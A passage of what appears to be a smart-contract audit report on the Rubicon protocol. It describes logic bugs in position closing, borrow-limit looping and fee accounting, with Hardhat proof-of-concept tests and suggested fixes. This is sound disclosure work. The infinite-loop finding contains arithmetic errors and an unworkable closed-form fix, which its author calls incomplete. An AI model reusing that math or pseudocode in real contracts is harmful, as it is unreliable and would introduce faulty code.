
## [[M-17] The return value of `buyAllAmount` is incorrect](https://github.com/code-423n4/2023-04-rubicon-findings/issues/714)
*Submitted by [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/714), also found by [cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1383), [ElKu](https://github.com/code-423n4/2023-04-rubicon-findings/issues/734) and [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/381)*.

`buyAllAmount` will return the amount of tokens spent on the exchange, but the actual return value is less than the actual amount of tokens spent.

Consider WBTC price is 10000 USDC and the total fee is 10%.
The user calls `buyAllAmount` to buy 1 WBTC, and the calculated `fill_amt` is 10,000 USDC.

```solidity
    function buyAllAmount(
        ERC20 buy_gem,
        uint256 buy_amt,
        ERC20 pay_gem,
        uint256 max_fill_amount
    ) external returns (uint256 fill_amt) {
        require(!locked);
        uint256 offerId;
        while (buy_amt > 0) {
            //Meanwhile there is amount to buy
            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair
            require(offerId != 0, "offerId == 0");

            // There is a chance that buy_amt is smaller than 1 wei of the other token
            if (
                mul(buy_amt, 1 ether) <
                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)
            ) {
                break; //We consider that all amount is sold
            }
            if (buy_amt >= offers[offerId].pay_amt) {
                //If amount to buy is higher or equal than current offer amount to sell
                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator
                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy
                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer
            } else {
                //if lower
                fill_amt = add(
                    fill_amt,
                    rmul(
                        mul(buy_amt, 10 ** 9),
                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)
                    ) / 10 ** 9
                ); //Add amount sold to acumulator
                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need
                buy_amt = 0; //All amount is bought
            }
```

In the `buy` function, the 1 WBTC to be purchased minus the fee is 0.9 WBTC. That is, the user actually spends 10,000 USDC to buy 0.9 WBTC, and the `fill_amt` finally returned is 10000 USDC minus the fee is 9000 USDC, but the user actually spends 10000 USDC, which causes the return value of `buyAllAmount` to be incorrect.

```solidity
        require(
            fill_amt <= max_fill_amount,
            "fill_amt exceeds max_fill_amount"
        );
        fill_amt = calcAmountAfterFee(fill_amt);
    }
```

### Proof of Concept

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1064-L1107>

### Recommended Mitigation Steps

Change to:

```diff
        require(
            fill_amt <= max_fill_amount,
            "fill_amt exceeds max_fill_amount"
        );
-       fill_amt = calcAmountAfterFee(fill_amt);
    }
```

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/714#issuecomment-1564422059):**
 > It's not a duplicate, as it's not about incorrect calculation. It's about the return amount being exclusive of fees when it should.

***

## [[M-18] Cannot close leveraged positions](https://github.com/code-423n4/2023-04-rubicon-findings/issues/702)
*Submitted by [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/702), also found by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1316) and [Jigsaw](https://github.com/code-423n4/2023-04-rubicon-findings/issues/73)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L280-L302> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223>

Opening a leveraged position goes through some cycles of supplying collateral and borrowing. Since the leverage is larger than 1, the borrowed amount is usually larger than the liquid asset. So in most cases, you would need to repeat the loop backwards (repay, redeem, swap...). However, `closePosition` tries to repay the whole borrowed amount at once, which would revert. As a result, the user would fail to close a position if he has no extra liquid assets.

### Proof of Concept

`closePosition` first repays the borrowed asset, then redeems the collateral and closes the position:

```solidity
/* Position.sol # closePosition */
  _repay(asset, quote, posId);
  _redeem(asset, bathTokenAmount);

  _removePosition(posId);
```

`_repay` would always try to repay the whole borrowed quote tokens, so first it would sell the asset tokens for quote tokens. However, since this is a leveraged position, there won't be enough asset tokens to sell here:

```solidity
/* Position.sol # _repay */
  address _bathTokenQuote = bathHouseV2.getBathTokenFromAsset(_quote);
  uint256 _amountToRepay = borrowBalanceOfPos(_posId); // total borrowed quote tokens

  // sell asset for quote
  _rubiconSwap(_asset, _quote, _amountToRepay, false);
  uint256 _quoteBalance = IERC20(_quote).balanceOf(address(this));
```

It would try to replenish the asset tokens from the owner, which would fail if there's not enough balance:

```solidity
/* Position.sol # _marketSell */
  if (_assetBalance < _payAmount) {
      IERC20(_asset).transferFrom(
          msg.sender,
          address(this),
          _payAmount.sub(_assetBalance).add(_fee)
      );
  }
```

The below test shows that the position closing would revert if there's not enough assets:

```javascript
  it.only("Cannot close position", async function () {
    const { owner, testCoin, testStableCoin, Position, rubiconMarket } =
      await loadFixture(deployPoolsUtilityFixture);

    await Position.connect(owner).buyAllAmountWithLeverage(
      testCoin.address,
      testStableCoin.address,
      TEST_AMOUNT,
      parseUnits("2.97")
    );

    /* Revoke: as if there were no assets */
    await testCoin.connect(owner).approve(Position.address, parseUnits("0"));
    /* Cannot close position without enough assets */
    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;
  });
```

### Tools Used

Hardhat

### Recommended Mitigation Steps

Add a repay loop (repay - redeem - swap...), or enable partially closing positions.

**[daoio (Rubicon) disagreed with severity, disputed and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/702#issuecomment-1534541407):**
 > It's mainly intended behavior and user needs to firstly repay the debt before redemption of his tokens; though, I like the idea of partially closing position.

**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/702#issuecomment-1575988291):**
 > If I open a position, I should be able to close it in the same block without requiring further capital from my end because it should unwind correctly.
> 
> Considering this Medium severity because the debt can be repaid and have the position closed, so there isn't exactly a loss of funds, but it's bad UX arising from unsatisfactory unwinding behaviour.

***

## [[M-19] A liquidated position possibly cannot be closed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/683)
*Submitted by [thekmj](https://github.com/code-423n4/2023-04-rubicon-findings/issues/683), also found by [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1182), [bin2chen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/870) and [ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/828)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397>

The `Compound V2` protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)

The problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.

This is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info that any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.

### Proof of concept

We will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.

*   Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follows:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203>

```
return {
  rubiconMarket,
  testCoin,
  cToken,
  owner,
  otherAccount,
  testStableCoin,
  cTokenStable,
  Position,
  priceOracle, // add this
  comptroller, // add this
};
```

*   Then, paste the following test:

```
describe("Liquidated position bug", function () {
  it("POC", async function () {
    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(
      deployPoolsUtilityFixture
    ); // I really went all out on this didn't I?

    // assert that, initially, the Position contract holds no cTokens
    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);

    // let's first open a long position with 2x margin
    await Position.connect(owner).buyAllAmountWithLeverage(
      testCoin.address,
      testStableCoin.address,
      TEST_AMOUNT,
      x2_332
    );

    // now drop the price to half
    await priceOracle.addCtoken(cToken.address, parseUnits("0.5", 18));

    // caveat: gotta set the close factor and liq incentive first
    await comptroller.connect(owner)._setCloseFactor(parseUnits("0.5"));
    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits("0.1"));

    // now fund otherAccount with some testStableCoin, and liquidate
    await testStableCoin.connect(otherAccount).faucet();
    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits("100000")); // excess approval is fine
    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits("12", 6), cToken.address); // liquidated!

    // now attempt to close the position, but fail
    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;

    // however, the position contract still have cToken, but also positive debt
    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);
    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);
  });
});
```

It is worth noting that the funds *can* still be recovered. This is because `Compound` exposes a function, `repayBehalf`, allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function, `withdraw`, allowing users to withdraw their `CTokens` directly and redeem.

**However**, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.

The most serious impact here, we believe, is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a "technically liquidated" position can be withdrawn, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.

### Tools used

Manual review + Hardhat for POC/testing

### Recommended mitigation

This is a very difficult problem to address due to its nature as a business logic problem. At the very least, it is not possible to tell whether "a position was liquidated", due to the way cross-margin positionings work.

We suggest exposing the following extra functionalities to address the immediate problem:

*   A "close position given margin" function, quite literally the opposite counterpart of "open position" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.
    *   The point here is, the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.
*   A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/683#issuecomment-1576010894):**
 > While similar, not a dup of [#702](https://github.com/code-423n4/2023-04-rubicon-findings/issues/702) because their conditions are different. The fixes may have some overlap, though (but also potentially different since this issue leans toward management of partially liquidated positions).

***

## [[M-20] `Position` contract allows to interact with positions that are liquidated](https://github.com/code-423n4/2023-04-rubicon-findings/issues/670)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/670)*.

`Position` contract allows to interact with positions that are liquidated. Because of that user can loose funds.

### Proof of Concept

When new position is created, the amount of tokens that were supplied as collateral [are saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.
Later, when the user wants to close position, they will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).
If a user wants to add collateral to avoid liquidation or for any other reason, they can call `increaseMargin`, which will [increase their bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.

In this case, if `Position bathToken` collateral is liquidated, that means that their debt becomes 0 and if they call `closePosition`, then the call will revert, as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) `bathToken` amount that the `Position` contract doesn't control anymore.

So in this case, if the user will call `increaseMargin`, just after it was liquidated, then the provided collateral will never be possible to withdraw, as `closePosition` will always revert.

Example:
1. User has open position for bathUSDC, with an amount of 1000 bathUSDC.<br>
2. Their position is under liquidation so they want to `increaseMargin` with 100 USDC more.<br>
3. Liquidation happens before `increaseMargin` was called, so the `Position` contract bathUSDC balance is now 0 and `increaseMargin` mints 100 bathUSDC more.<br>
4. `increaseMargin` increased the position's bath amount to 1100.<br>
5. The user realized that they couldn't save position and now want to get back collateral, they call `closePosition`.<br>
6. `closePosition` reverts when redeeming as a `Position` contract that doesn't have 1100 bathUSDC, only 100 USDC.

As a result, the  user's 100 USDC is locked and can be used only as collateral for borrowing.

### Tools Used

VsCode

### Recommended Mitigation Steps

Do not allow users to interact with liquidated positions.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/670#issuecomment-1547180974)**

***

## [[M-21] `Position._borrowLimit` doesn't use exisiting collateral in case if user doesn't have any `_bathToken`](https://github.com/code-423n4/2023-04-rubicon-findings/issues/604)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/604)*.

`Position._borrowLimit` doesn't use exisiting collateral in case if user doesn't have any `_bathToken`.

### Proof of Concept

`Position._borrowLimit` function is used to calculate how many times user needs to make borrow loop and how many percent of maximum allowed amount to borrow. <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L526-L583>

```solidity
    function _borrowLimit(
        address _bathToken,
        address _asset,
        uint256 _assetAmount,
        uint256 _leverage
    ) internal returns (uint256 _limit, uint256 _lastBorrow) {
        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);
        // how much is needed to borrow in asset form
        uint256 _desiredAmount = wmul(_assetAmount, _leverage);


        // check if collateral was already supplied
        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
	// how much is borrowed on a current loop
        uint256 _loopBorrowed;


        while (_assetAmount <= _desiredAmount) {
            if (_limit == 0) {
		// if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);


		    // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );
                } else {
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);
                }
            } else {
                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);
            }


            // here _assetAmount refers to the
            // TOTAL asset amount in the position
            _assetAmount += _loopBorrowed;


            if (_assetAmount > _desiredAmount) {
                // in case we've borrowed more than needed
                // return excess and calculate how much is
                // needed to borrow on the last loop
                // to not overflow _desiredAmount
                uint256 _borrowDelta = _desiredAmount.sub(
                    _assetAmount.sub(_loopBorrowed)
                );
                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);


                _limit++;
                break;
            } else if (_assetAmount == _desiredAmount) {
                // 1x short or perfect matching
                _limit++;
                break;
            } else {
                // default case
                _limit++;
            }
        }
    }
```

Inside the `while` loop there is one interesting thing: `if (_minted != 0)`.
If this `true`, that means that the user currently has some amount of `_bathToken`, which means that they already have some collateral that can be used to borrow on it. The `_maxBorrow(_bathToken)` function is called in order to know how many collateral user has and what is the max amount they can borrow using that collateral.

But in this case, if this `if (_minted != 0)` is not true, it means that the user currently doesn't have any `_bathToken`, then `_maxBorrow(_bathToken)` will not be called. However, the user still can have collateral other than `_bathToken` token.
In this case, that collateral also should be used to borrow on it, but it's ignored.

Scenario:<br>
1.The user opened position using bathUSDC and they currently have some amount as collateral inside bathUSDC.<br>
2.Then they open positions using bathETH and in this case their bathUSDC collateral is not used.

### Tools Used

VsCode

### Recommended Mitigation Steps

You should check if the user has liquidity
`(uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller.getAccountLiquidity(address(this));`
In this case if `_liq` is not 0, then you should call `_maxBorrow(_bathToken)` and use that collateral.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/604#issuecomment-1534572978)**

***

## [[M-22] Potential infinite loop in `_borrowLimit` function](https://github.com/code-423n4/2023-04-rubicon-findings/issues/557)
*Submitted by [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/557), also found by [0xPkhatri](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1294), [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/992), [thekmj](https://github.com/code-423n4/2023-04-rubicon-findings/issues/650), [anodaram](https://github.com/code-423n4/2023-04-rubicon-findings/issues/505) and [volodya](https://github.com/code-423n4/2023-04-rubicon-findings/issues/180)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542> <br><https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159>

The infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.

### Proof of Concept

The `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.

The function works as follows:

1.  Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.
2.  Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`.
3.  Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.
4.  Initialize a `while` loop that continues until the `_assetAmount` is less than or equal to the desired amount.
5.  In each loop iteration:
    1.  Calculate the amount that can be borrowed in the current loop `_loopBorrowed` based on the collateral factor and any previously supplied collateral.
    2.  Update the total asset amount in the position by adding the borrowed amount from the current loop.
    3. Check if the updated asset amount has reached or exceeded the desired amount:
        *   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.
        *   If the asset amount perfectly matches the desired amount, increment the borrowing limit.
        *   In other cases, increment the borrowing limit and proceed to the next iteration.

The calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function.

`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:

1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.
2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.
3.  `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:
    *   Calls the `mul` function to multiply `x` and `y`.
    *   Adds half of the fixed-point base (WAD/2) to the result using the `add` function. This step is crucial for rounding the result correctly.
    *   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.

Now that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite:

```solidity
function _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)
```

Additionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged:

```
    // collateralFactor = 70% for cTokenStable
    await comptroller._setCollateralFactor(
      cTokenStable.address,
      parseUnits("0.7", 18)
    );
    // collateralFactor = 70% for cToken
    await comptroller._setCollateralFactor(
      cToken.address,
      parseUnits("0.7", 18)
    );
```

Calculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).

Now, let's examine what happens within the `while loop`:

```solidity
            if (_limit == 0) {
		// if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);

		    // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );

                } else {
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);
                    
                }
            } else {
                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);
                
            }
```

The important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`.

*   On the first iteration: (limit == 0)
    *   `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18
    *   `_assetAmount` = 25e18 + 17.5e18 = 42.5e18
*   On the second iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18
    *   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18
*   On the third iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18
    *   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18

So, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.

Given that `_loopBorrowed` is "dividing from itself", what would happen if it goes to 1, or even 0, but the desired amount is big enough?

But... how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?

```

    // collateralFactor = 70% for cTokenStable
    await comptroller._setCollateralFactor(
      cTokenStable.address,
      parseUnits("0.7", 18)
    );
    // collateralFactor = 70% for cToken
    await comptroller._setCollateralFactor(
      cToken.address,
      parseUnits("0.5", 18)
    );
```

Let's do the exercise again with a reduced collateral factor:

*   On the first iteration: (limit == 0)
    *   `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18
    *   `_assetAmount` = 25e18 + 12.5e18 = 37.5e18
*   On the second iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18
    *   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18
*   On the third iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18
    *   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18

<!---->

*   On the fourth iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18
    *   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18
*   On the fifth iteration: (limit != 0)
    *   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18
    *   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18

Now that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.

At this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.

You can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep "should open long position"` command from the existing test suite, which will produce the following output:

![](https://i.imgur.com/OgNHyLc.png)

I have added some console logs for you if you want a visual representation:

```solidity
  function _borrowLimit(
        address _bathToken,
        address _asset,
        uint256 _assetAmount,
        uint256 _leverage
    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {
        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);
        // how much is needed to borrow in asset form
        uint256 _desiredAmount = wmul(_assetAmount, _leverage);
        console.log(_desiredAmount, "desiredAmount");

        // check if collateral was already supplied
        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
        
        // how much is borrowed on a current loop
        uint256 _loopBorrowed;
        
        while (_assetAmount <= _desiredAmount) {
            console.log("****** in loop");
            if (_limit == 0) {
		// if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);

                    console.log("max", _max);

		    // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );

                } else {
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);
                    
                }
            } else {
                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);
                
            }


            console.log("_loopBorrowed", _loopBorrowed);

            // here _assetAmount refers to the
            // TOTAL asset amount in the position
            _assetAmount += _loopBorrowed;
            console.log("_assetAmount", _assetAmount);

            if (_assetAmount > _desiredAmount) {
                // in case we've borrowed more than needed
                // return excess and calculate how much is
                // needed to borrow on the last loop
                // to not overflow _desiredAmount
                uint256 _borrowDelta = _desiredAmount.sub(
                    _assetAmount.sub(_loopBorrowed)
                );
                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);

                _limit++;
                break;
            } else if (_assetAmount == _desiredAmount) {
                // 1x short or perfect matching
                _limit++;
                break;
            } else {
                // default case
                _limit++;
            }

            console.log("limit", _limit);
        }
    }
```

In conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.

This is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.

### Recommended Mitigation Steps

That's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.

**Limit the number of iterations**:

Introduce a maximum number of iterations that the `while` loop can run, preventing the function from running indefinitely.

This approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors.

Instead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.

```solidity
uint256 maxIterations = 50;
uint256 currentIteration = 0;

while (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {
    // existing logic
    currentIteration++;
}

```

**Restrict the minimum `_loopBorrowed` value**:

Define a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold.

This approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.

```solidity
uint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals

while (_assetAmount <= _desiredAmount) {
    // existing logic

    if (_loopBorrowed < minLoopBorrowed) {
        break;
    }
}
```

**Use a more sophisticated algorithm**:

Instead of a `while` loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount.

It might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop.

However, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.

For instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:

```solidity
function borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {
    // Calculate the borrowing limit using the closed-form solution
    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);

    return borrowLimit;
}

```

To apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount.

Instead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.

For example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. 

Using the closed-form solution formula: `n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`.

Substituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`.

After calculating, we get: `n ≈ 1.58`.

Since `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`.

We can now calculate the final borrowed amount using the formula for the sum of a geometric series: `Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`.

Substituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`.

Calculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`.

Thus, the final borrowed amount is: `5,000 = 5,000 + 2,500`.

Now that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit.

If the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.

The pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:

```solidity
function _borrowLimit(
    address _bathToken,
    address _asset,
    uint256 _assetAmount,
    uint256 _leverage
) internal view returns (uint256 _limit, uint256 _lastBorrow) {
    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);
    uint256 _desiredAmount = wmul(_assetAmount, _leverage);

    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));

    if (_minted != 0) {
        uint256 _max = _maxBorrow(_bathToken);
        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);
    }

    if (_collateralFactor == WAD) {
        // Collateral factor is 1, which means it's a 1x short or perfect matching
        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);
        _lastBorrow = wmul(_assetAmount, _collateralFactor);
    } else {
        // Calculate the number of terms using the closed-form formula for a geometric series
        _limit = uint256(
            log1p(
                wdiv(
                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),
                    _assetAmount.mul(_collateralFactor)
                )
            ).div(log1p(_collateralFactor.sub(WAD)))
        );

        // Calculate the last borrow amount
        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);
    }
}

```

Please note that the provided solution is incomplete and requires additional adjustments.

**[daoio (Rubicon) acknowledged and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/557#issuecomment-1547179421):**
 > Yeah, it's correct, it will loop infinitely if `collateralFactor` < ~66%, that's known. The report relies on `bathToken's` risk params, which is out-of-scope, though the report itself is just incredibly HQ.

***

## [[M-23] Attack on rounding errors to get risk free profit](https://github.com/code-423n4/2023-04-rubicon-findings/issues/540)
